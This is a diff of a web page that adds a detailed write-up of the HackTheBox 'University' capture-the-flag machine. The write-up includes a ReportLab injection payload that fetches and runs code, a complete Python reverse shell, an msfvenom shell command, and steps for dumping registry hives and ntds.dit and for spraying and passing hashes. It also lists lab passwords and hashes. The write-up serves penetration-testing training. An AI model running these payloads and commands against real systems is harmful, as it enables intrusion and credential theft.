@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>University - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/University.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for University machine from HackTheBox - Insane difficulty level">
+    <meta name="description" content="Detailed writeup for University machine from HackTheBox - Insane difficulty level">
     <meta name="keywords" content="HackTheBox, University, Insane, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,316 @@
         <h1 class="writeup-title">University</h1>
         <div class="writeup-metadata">
             <span class="difficulty insane">Insane</span>
-            <span class="date">Active machine</span>
+            <span class="date">August 9, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="University" src="../images/University/pwned.png" /></p>
-<p>University is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once University retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/University/pwned.png" /></p>
+<p>University was an excellent insane-difficulty Active Directory machine that demonstrated a comprehensive attack chain involving web application exploitation, certificate forgery, lateral movement, and privilege escalation through backup operators group abuse.
+The initial foothold was achieved through exploiting CVE-2023-33733 in ReportLab's PDF generation functionality, where malicious Python code injected into the bio field enabled remote code execution and established a reverse shell as the web application user.</p>
+<p>The attack progressed through credential discovery in automated backup scripts, revealing the password 'WebAO1337' for the wao user, enabling WinRM access to the domain controller.
+Network pivoting using ligolo-ng revealed additional machines in the 192.168.99.0/24 subnet, including WS-3 (a vulnerable Windows workstation) and LAB-2 (a Linux machine), both accessible with the same wao credentials.</p>
+<p>A critical pivot point involved forging professor certificates using compromised CA files found on the domain controller.
+By generating a certificate signing request for the 'george' professor account and signing it with the extracted rootCA.crt and rootCA.key, I gained elevated web application access.
+This enabled uploading malicious lecture files containing URL shortcuts pointing to local executables, achieving code execution on WS-3 when the automated get-lectures script processed the content.</p>
+<p>The final escalation leveraged LocalPotato (CVE-2023-21746) to achieve administrator privileges on the outdated WS-3 workstation, enabling extraction of registry hives that revealed Martin.T's default domain password 'v3ryS0l!dP@sswd#X'.
+Password spraying identified many users with the default password set, among which was Brose.W, who belonged to the Backup Operators group with SeBackupPrivilege.
+Using diskshadow to create volume snapshots and robocopy in backup mode, I extracted the domain controller's SAM, SYSTEM, and ntds.dit files, ultimately obtaining the administrator hash and achieving full domain compromise.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/University/nmap.png" /></p>
+<p>There are quite a few ports open on this machine, and judging by the services, it's most likely a domain controller. There is also a website on port 80.</p>
+<h2>Exploring the website</h2>
+<p><img alt="website" src="../images/University/website.png" /></p>
+<p>To freely browse the website, I need to create an account. I can make a student one or a professor one.</p>
+<p><img alt="no" src="../images/University/no.png" /></p>
+<p>But it seems like I won't be able to create a professor account right now. I'll focus on the other option.</p>
+<p><img alt="login" src="../images/University/login.png" /></p>
+<p>After successfully creating the account, the <code>cert request</code> option on the left intrigued me.</p>
+<p><img alt="sign" src="../images/University/sign.png" /></p>
+<p>Certificates can be used as an alternative way to login to the website.</p>
+<p>If I manage to create, or get ahold of, a professor account, I'll be able to upload files onto the target. I'll keep this in my mind for later.</p>
+<p>Browsing through the course list, I noted down the professor names for later use.</p>
+<div class="codehilite"><pre><span></span><code>nya
+martin.rose
+Nour
+carol
+george
+</code></pre></div>
+
+<h2>RCE via reportlabs CVE</h2>
+<p><img alt="export" src="../images/University/export.png" /></p>
+<p>Back in the profile page, I can export the profile as a PDF.</p>
+<p><img alt="strings" src="../images/University/strings.png" /></p>
+<p>Running strings against the PDF reveals that it was generated with ReportLab, which is a Python PDF generation library.</p>
+<p>I searched for CVEs affecting ReportLabs, and I found something promising.</p>
+<div class="codehilite"><pre><span></span><code>https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897
+
+https://github.com/c53elyas/CVE-2023-33733
+</code></pre></div>
+
+<p><img alt="rte" src="../images/University/rte.png" /></p>
+<p>The <code>bio</code> field looks like an appropriate target for this attack.</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">&lt;para&gt;&lt;font</span><span class="w"> </span><span class="na">color=</span><span class="s">&quot;[[[getattr(pow, Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;curl http://10.10.16.45:8000/shell.py | python&#39;) for Word in [ orgTypeFun( &#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: 1 == 0, &#39;__eq__&#39;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: { setattr(self, &#39;mutated&#39;, self.mutated - 1) }, &#39;__hash__&#39;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#39;red&#39;&quot;</span><span class="nt">&gt;&lt;/para&gt;</span>
+</code></pre></div>
+
+<p>This payload will attempt to download a shell.py file from my box, which will contain this reverse shell:</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">threading</span><span class="p">;</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">s2p</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">):</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="kc">True</span><span class="p">:</span>
+<span class="w">        </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span>
+<span class="w">            </span><span class="n">p</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="w">            </span><span class="n">p</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">p2s</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">):</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="kc">True</span><span class="p">:</span>
+<span class="w">        </span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.10.16.45&quot;</span><span class="p">,</span><span class="mi">9001</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s2">&quot;powershell&quot;</span><span class="p">],</span><span class="w"> </span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span><span class="w"> </span><span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+
+<span class="n">s2p_thread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">s2p</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">])</span>
+<span class="n">s2p_thread</span><span class="o">.</span><span class="n">daemon</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">True</span>
+<span class="n">s2p_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+<span class="n">p2s_thread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">p2s</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">])</span>
+<span class="n">p2s_thread</span><span class="o">.</span><span class="n">daemon</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">True</span>
+<span class="n">p2s_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+<span class="k">try</span><span class="p">:</span>
+<span class="w">    </span><span class="n">p</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+<span class="k">except</span><span class="w"> </span><span class="n">KeyboardInterrupt</span><span class="p">:</span>
+<span class="w">    </span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Nothing happened after I clicked submit, but a few seconds after I pressed the export button, I got a hit on my python server.</p>
+<p><img alt="python" src="../images/University/python.png" /></p>
+<p>And then, on my listener.</p>
+<p><img alt="shell" src="../images/University/shell.png" /></p>
+<h2>Exploring the DC</h2>
+<p>In the landing folder, I found two interesting things.</p>
+<p><img alt="cert" src="../images/University/cert.png" /></p>
+<p>The database, and a CA folder which contained the root CA's. I could use them to forge professor certificates and login if they have not been revoked.</p>
+<p>Since this DC has python installed, I'll exfiltrate the files by using an http server.</p>
+<p><code>python -m http.server</code></p>
+<p>And then pulling each file onto my box.</p>
+<div class="codehilite"><pre><span></span><code>curl 10.10.11.39:8000/CA/rootCA.crt -o rootCA.crt
+
+curl 10.10.11.39:8000/db.sqlite3 -o db.sqlite3
+</code></pre></div>
+
+<p><img alt="database" src="../images/University/database.png" /></p>
+<p>The only interesting thing in the database is the professor's public key format. If I'd want to use a forged key, I'll probably have to convert it to an ASCII armored one first.</p>
+<p>Continuing my enumeration, I found a <code>db-backup-automator.ps1</code> script in the DB Backups directory.</p>
+<div class="codehilite"><pre><span></span><code>$sourcePath = &quot;C:\Web\University\db.sqlite3&quot;
+$destinationPath = &quot;C:\Web\DB Backups\&quot;
+$7zExePath = &quot;C:\Program Files\7-Zip\7z.exe&quot;
+
+$zipFileName = &quot;DB-Backup-$(Get-Date -Format &#39;yyyy-MM-dd&#39;).zip&quot;
+$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
+$7zCommand = &quot;&amp; `&quot;$7zExePath`&quot; a `&quot;$zipFilePath`&quot; `&quot;$sourcePath`&quot; -p&#39;WebAO1337&#39;&quot;
+Invoke-Expression -Command $7zCommand
+</code></pre></div>
+
+<p>Which contained a password. Since my current user is wao, and their name is included in the password, it may allow me to login to the box as them.</p>
+<p><code>evil-winrm -i 10.10.11.39 -u wao -p WebAO1337</code></p>
+<p><img alt="winrm" src="../images/University/winrm.png" /></p>
+<p>This will allow me to skip the ReportLab RCE step, like a checkpoint.</p>
+<h2>Setting up a ligolo tunnel</h2>
+<p>I looked around the DC for more information and found out that the DC had access to an additional subnet.</p>
+<p><img alt="subnets" src="../images/University/subnets.png" /></p>
+<p>I'd like to scan it for any machines that may be reachable from the DC. I will transfer a ligolo agent onto the target, then I'll create a tunnel through which I will scan the subnet with nmap, and any machines it finds as well.</p>
+<p>After transferring the agent, I need to run a few commands in order to create a tunnel between my machine and the DC.</p>
+<div class="codehilite"><pre><span></span><code>sudo ip tuntap add user kalin mode tun ligolo | Adds a new interface
+
+sudo ip link set ligolo up | Enables the interface
+
+sudo ip route add 192.168.99.0/24 dev ligolo | Adds a route to the target subnet
+</code></pre></div>
+
+<p>After that, I can run <code>ligolo-proxy -selfcert</code> on my machine, and <code>.\agent.exe -connect 10.10.16.45:11601 -ignore-cert</code> on the DC.</p>
+<p><img alt="ligolo" src="../images/University/ligolo.png" /></p>
+<p>Initially, I wanted to scan the whole subnet with nmap. However, this would cause my ligolo session to die after a minute or so, which made me switch to a different approach.</p>
+<p>I'll reuse a simple FOR loop from the Reddish machine to scan the subnet for active machines.</p>
+<p><code>for i in $(seq 1 256); do ping -c 1 192.168.99.$i; done</code></p>
+<p><img alt="addresses" src="../images/University/addresses.png" /></p>
+<p>There were 3 hits. 192.168.99.1(the DC), 192.168.99.2 and 192.168.99.12.</p>
+<p>Now that I have the singular IPs, I can use nmap to scan them one by one.</p>
+<p>192.168.99.2 is a windows machine:
+<img alt="scan1" src="../images/University/scan1.png" /></p>
+<p>And 192.168.99.12 is a linux box with SSH enabled:
+<img alt="scan2" src="../images/University/scan2.png" /></p>
+<h2>Enumerating the other machines</h2>
+<p>I checked whether wao's login would work on the discovered machines.</p>
+<p>First, the windows machine.</p>
+<p><img alt="ws3" src="../images/University/ws3.png" /></p>
+<p>I can login to the WS-3 workstation as wao.</p>
+<p><img alt="lab2" src="../images/University/lab2.png" /></p>
+<p>And into the linux machine, LAB-2, as well.</p>
+<h3>Examining the LAB-2 machine</h3>
+<p>The only interesting thing on the LAB-2 machines were root certificates.</p>
+<p><img alt="certs2" src="../images/University/certs2.png" /></p>
+<p>Which I downloaded onto my machine via scp.</p>
+<p><code>scp wao@192.168.99.12:/home/wao/Downloads/CA/rootCA.crt lab2certs/</code></p>
+<p>These were identical to the ones found on the DC. Not much else, but the machine can reach WS-3 directly, which could come in handy later.</p>
+<h3>Examining the WS-3 machine</h3>
+<p>In <code>C:\Users\wao\Desktop</code>, I found a README.txt note.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">Hello</span><span class="w"> </span><span class="n">Professors</span><span class="p">.</span>
+<span class="n">We</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">created</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">note</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="nl">computers:</span><span class="w"> </span><span class="n">WS</span><span class="o">-</span><span class="mh">1</span><span class="p">,</span><span class="w"> </span><span class="n">WS</span><span class="o">-</span><span class="mh">2</span><span class="p">,</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">WS</span><span class="o">-</span><span class="mf">3.</span>
+<span class="n">These</span><span class="w"> </span><span class="n">computers</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">updated</span><span class="w"> </span><span class="n">since</span><span class="w"> </span><span class="mh">10</span><span class="o">/</span><span class="mh">29</span><span class="o">/</span><span class="mf">2023.</span>
+<span class="n">Since</span><span class="w"> </span><span class="n">these</span><span class="w"> </span><span class="n">devices</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="n">evaluation</span><span class="w"> </span><span class="n">purposes</span><span class="p">,</span><span class="w"> </span><span class="n">they</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="k">always</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">latest</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">updates</span><span class="p">.</span>
+<span class="n">So</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">sure</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">complete</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">assessments</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">move</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">computers</span><span class="w"> </span><span class="s">&quot;WS-4&quot;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="s">&quot;WS-5&quot;</span><span class="p">.</span>
+<span class="n">The</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">team</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="k">begin</span><span class="w"> </span><span class="n">working</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">updates</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">applying</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">policies</span><span class="w"> </span><span class="n">early</span><span class="w"> </span><span class="n">next</span><span class="w"> </span><span class="n">month</span><span class="p">.</span>
+<span class="n">Best</span><span class="w"> </span><span class="n">regards</span><span class="p">.</span>
+<span class="n">Help</span><span class="w"> </span><span class="n">Desk</span><span class="w"> </span><span class="n">team</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Rose</span><span class="w"> </span><span class="n">Lanosta</span><span class="p">.</span>
+</code></pre></div>
+
+<p>This workstation may be vulnerable to one or more of the older exploits. The scope will become clearer once I find something exploitable.</p>
+<p>In <code>C:\program files\Automation-Scripts\</code>, I found two powershell scripts which I cannot read.</p>
+<p>The get-lectures script makes me think back to the professor accounts on the website, so I'll change my focus to that.</p>
+<h2>Forging a professor certificate</h2>
+<p>I'll create a certificate signing request(.csr) and a key file(.key) with the command mentioned in the <code>request signed-cert</code> menu earlier.</p>
+<p><code>openssl req -newkey rsa:2048 -keyout george.key -out george.csr</code></p>
+<p>I'll set the common name to <code>george</code>, and the email address to <code>george@university.htb</code></p>
+<p><img alt="keycreate" src="../images/University/keycreate.png" /></p>
+<p>After that, I can sign the request with the rootCA's I've gathered earlier. I'll use the ones I got from the DC.</p>
+<p><code>openssl x509 -req -in george.csr -CA certs/rootCA.crt -CAkey certs/rootCA.key &gt; george.crt</code></p>
+<p><img alt="cert" src="../images/University/cert.png" /></p>
+<p>I should be able to login as george with this certificate.</p>
+<p><img alt="george" src="../images/University/george.png" /></p>
+<h2>Uploading a malicious lecture</h2>
+<p>After going to manage my courses, clicking learn more on any of them, and navigating to <code>add a new lecture</code>, I came across the lecture upload form.</p>
+<p><img alt="lectures" src="../images/University/lectures.png" /></p>
+<p>It requires a gpg signature, but I don't even have a key yet. Before doing anything with that, I'll download the lecture sample zip to see how the files should be structured.</p>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">Referece</span><span class="o">-</span><span class="mf">1.</span><span class="n">url</span>
+
+<span class="o">[</span><span class="n">InternetShortcut</span><span class="o">]</span>
+<span class="n">URL</span><span class="o">=</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">site1</span><span class="p">.</span><span class="n">reference</span><span class="p">.</span><span class="n">com</span>
+<span class="n">IDList</span><span class="o">=</span>
+</code></pre></div>
+
+<p>It is possible to point the link to a local file on the system. For example:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">[InternetShortcut]</span>
+<span class="na">URL</span><span class="o">=</span><span class="s">file://C:/programdata/shell.exe</span>
+<span class="na">IDList</span><span class="o">=</span>
+</code></pre></div>
+
+<p>Will execute shell.exe instead of opening an online reference. Since the get-lectures script is located on WS-3, I will place a reverse shell there once everything is ready.</p>
+<h3>Creating a PGP key</h3>
+<p>I generated a PGP key with <code>gpg --generate-key</code>, once again providing the username <code>george</code> and the email address of <code>george@university.htb</code></p>
+<p><img alt="georgegpg" src="../images/University/georgegpg.png" /></p>
+<p>I'll extract a public key from this new creation, so that I can update it on the website. Otherwise, I will not be allowed to upload lectures signed with my new key.</p>
+<p><code>gpg --export -a "george" &gt; GPG-public-key.asc</code></p>
+<p><img alt="uploa" src="../images/University/uploa.png" /></p>
+<h3>Setting up for the reverse shell</h3>
+<p>Since the LAB-2 machine can access the WS-3 machine directly, I will point the reverse shell to connect back to a listener on LAB-2. This way I will avoid any issues stemming from the tunnel and possible blockades/firewall rules.</p>
+<p>In the case that it does not have netcat installed, I will use a python script to capture the revshell.</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.99.12 LPORT=9001 -f exe &gt; shell.exe</code></p>
+<p>I created an .exe shell with msfvenom, which will be placed on WS-3 under <code>C:\programdata\shell.exe</code></p>
+<p><img alt="uploaded" src="../images/University/uploaded.png" /></p>
+<p>Because I've updated the public key on the website, I can now use a detached signature like in the example, and it should be accepted.</p>
+<p><code>gpg -u george --detach-sign lecture.zip</code></p>
+<p>This will generate a <code>lecture.zip.sig</code> file, which I'll send alongside the zipped lecture.</p>
+<p>I stood up a netcat listener on LAB-2, and submitted the lecture.</p>
+<p><img alt="uploadsuccess" src="../images/University/uploadsuccess.png" /></p>
+<p>And not long after that, I received a hit on my listener.</p>
+<p><img alt="user" src="../images/University/user.png" /></p>
+<h1>Root flag</h1>
+<p>I will use the Windows Management Instrumentation Command-line to get the latest updates installed on WS-3. This will give me a rough idea of which exploits it could be vulnerable to.</p>
+<p><img alt="wmic" src="../images/University/wmic.png" /></p>
+<p>This machine has not been updated at all since November 2022.</p>
+<h2>Shell as administrator on WS-3</h2>
+<p>A bit of searching brought me to <code>https://github.com/decoder-it/LocalPotato</code>, which could allow me to overwrite the other script in the automation directory.</p>
+<p>I downloaded the .exe and used a simple ps1 reverse shell to overwrite the wpad-cache cleaner script.</p>
+<p><code>.\LocalPotato.exe -i rev.ps1 -o "\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1</code></p>
+<p><img alt="localpotato" src="../images/University/localpotato.png" /></p>
+<p>After waiting for approximately 10 minutes, I finally got a shell back.</p>
+<p><img alt="adminws3" src="../images/University/adminws3.png" /></p>
+<h2>Downloading the registry hives from WS-3</h2>
+<p>I immediately saved the hives in order to avoid having to redo these administrator steps in case the shell died. Now I can download them.</p>
+<p>However, while I managed to download the sam hive without issues, the system hive was too big and kept breaking my tunnel. I zipped it with tar to decrease its size.</p>
+<p><code>tar -a -c -f system.zip system</code></p>
+<p><img alt="zip" src="../images/University/zip.png" /></p>
+<p>This was too big as well. I pivoted to splitting the zipped hive into 1MB chunks, which should download without any issues.</p>
+<p><code>$filePath = 'C:\programdata\system.zip'; $chunkSize = 1MB; $in = [System.IO.File]::OpenRead($filePath); try { $i = 0; while ($in.Position -lt $in.Length) { $outPath = "{0}.{1:d4}" -f $filePath, $i; $out = [System.IO.File]::OpenWrite($outPath); $buffer = New-Object byte[] $chunkSize; $read = $in.Read($buffer, 0, $buffer.Length); $out.Write($buffer, 0, $read); $out.Close(); $i++ } } finally { $in.Close() }</code></p>
+<p><img alt="chunks" src="../images/University/chunks.png" /></p>
+<p>After downloading each of the chunks, I'll assemble the zipped hive.</p>
+<p><code>cat system.zip.* &gt; system.zip</code></p>
+<p>Then I'll unzip the archive, which contains the exact same system hive as the one left on the WS-3 machine.</p>
+<p><img alt="system" src="../images/University/system.png" /></p>
+<p>Now I can take both of the hives and use impacket-secretsdump locally to extract the stored hashes.</p>
+<p><code>impacket-secretsdump local -system system -sam sam</code></p>
+<p><img alt="secretsdump1" src="../images/University/secretsdump1.png" /></p>
+<h3>Getting more information by using remote secretsdump</h3>
+<p>This did not reveal much besides the administrator's hash. I'll try to get more info by performing a remote secretsdump, which will grab the most information from the actively used hives.</p>
+<p><code>impacket-secretsdump administrator@192.168.99.2 -hashes ':ba76a28db8aaeb636566a414f3e104aa'</code></p>
+<p><img alt="secretsdump2" src="../images/University/secretsdump2.png" /></p>
+<p><code>Martin.T/default password | v3ryS0l!dP@sswd#X</code></p>
+<h2>Password spray</h2>
+<p>Since I have a default password, I'd like to do a password spray to see if anyone else has an unchanged password.</p>
+<p>First, I need a userlist. I'll create one using netexec.</p>
+<p><code>nxc ldap 10.10.11.39 -u martin.t -p 'v3ryS0l!dP@sswd#X' --users</code></p>
+<p><img alt="lists" src="../images/University/lists.png" /></p>
+<p>I'll save it to a userlist, and I'll use awk to grab only the usernames.</p>
+<p><code>awk -F ' ' '{ print $5 }' userlist</code></p>
+<p><img alt="users" src="../images/University/users.png" /></p>
+<p>I will remove the non-user remains manually. Then I'll spray the default password against it.</p>
+<p><code>nxc ldap 10.10.11.39 -u finaluserlist -p 'v3ryS0l!dP@sswd#X' --continue-on-success</code></p>
+<p><img alt="passwordspra" src="../images/University/passwordspray.png" /></p>
+<p>the <code>(Pwn3d!)</code> message means that the user can remote into the machine.</p>
+<h2>Discovering the Backup Operators group</h2>
+<p>There are too many users to manually check which ones are valuable. I'll check which groups exist in the domain, and netexec will also show how many members are in each group.</p>
+<p><code>nxc ldap 10.10.11.39 -u martin.t -p 'v3ryS0l!dP@sswd#X' --groups</code></p>
+<p><img alt="groups" src="../images/University/groups.png" /></p>
+<p>The Backup Operators group has one member. This group allows its members to backup sensitive files, like registry hives.</p>
+<p><code>nxc ldap 10.10.11.39 -u martin.t -p 'v3ryS0l!dP@sswd#X' --groups 'Backup Operators'</code></p>
+<p><img alt="member" src="../images/University/member.png" /></p>
+<p>Brose Wayen, or <code>Brose.W</code>, is the only member of the Backup Operators group. They can also remote into the box, which means that getting the hives should be very simple.</p>
+<h2>Cloning the registry hives and ntds.dit from the DC</h2>
+<p>Brose.W has the SeBackupPrivilege, so I tried to save the two hives using reg save like earlier.</p>
+<p><img alt="faillogin" src="../images/University/faillogin.png" /></p>
+<p>The hives were smaller, and the administrator's hash I got from them did not work. This could be due to the files being locked by the OS, which blocks me from fully cloning them.</p>
+<p>There are a few tools that can be used with SeBackupPriv to alleviate this. I will use diskshadow, but it requires a bit more preparation.</p>
+<p>I created a simple script for diskshadow, that would clone the C: drive into a new Z: drive.</p>
+<div class="codehilite"><pre><span></span><code>set context persistent nowriters
+add volume C: alias shadow_c
+create
+expose %shadow_c% Z:
+</code></pre></div>
+
+<p><img alt="fail" src="../images/University/fail.png" /></p>
+<p>This fails because of the discrepancy between linux/windows when it comes to line endings.</p>
+<h3>Fixing the script</h3>
+<p>Linux/unix uses a single Line Feed character (LF) to mark the end of a line, while windows Uses a Carriage Return and a Line Feed (CRLF).</p>
+<p>The script can be "fixed" by using <code>unix2dos</code></p>
+<p><img alt="script" src="../images/University/script.png" /></p>
+<p>I'll copy the converted script onto the machine, and I'll run diskshadow once again.</p>
+<p><img alt="success" src="../images/University/success.png" /></p>
+<p>The script was executed successfully, and a <code>Z:</code> drive has been created. However, I still cannot do anything with these files.</p>
+<p><img alt="deneied" src="../images/University/denied.png" /></p>
+<p>This is because even though I made a copy, the hives can be read only by SYSTEM. With copy, my user's SeBackupPrivilege is not used as it simply tried to copy the file as Brose.W.</p>
+<h2>Copying the files with robocopy</h2>
+<p>Since my user has the privilege, I can use <code>robocopy</code> with the B switch to utilize it. This will run it in backup mode, which will bypass the restrictive file permissions.</p>
+<div class="codehilite"><pre><span></span><code>robocopy Z:\Windows\System32\config C:\programdata SAM /B
+
+robocopy Z:\Windows\System32\config C:\programdata SYSTEM /B
+</code></pre></div>
+
+<p>And since this is a domain controller, I'll grab the ntds.dit file as well.</p>
+<p><code>robocopy Z:\Windows\NTDS C:\programdata ntds.dit /B</code></p>
+<p><img alt="ntds" src="../images/University/ntds.png" /></p>
+<h2>Extracting hashes from the DC hives with secretsdump</h2>
+<p>With all of the files on my box, I can use secretsdump once again to extract the hashes of every user on the domain.</p>
+<p><code>impacket-secretsdump LOCAL -sam SAM -system SYSTEM -ntds ntds.dit</code></p>
+<p><img alt="secretsdump3" src="../images/University/secretsdump3.png" /></p>
+<p>This administrator hash is different, so I'll try logging into the machine with it.</p>
+<p><code>evil-winrm -i 10.10.11.39 -u administrator -H 'e63413bab01a0b8820983496c0be3a9a'</code></p>
+<p><img alt="root" src="../images/University/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
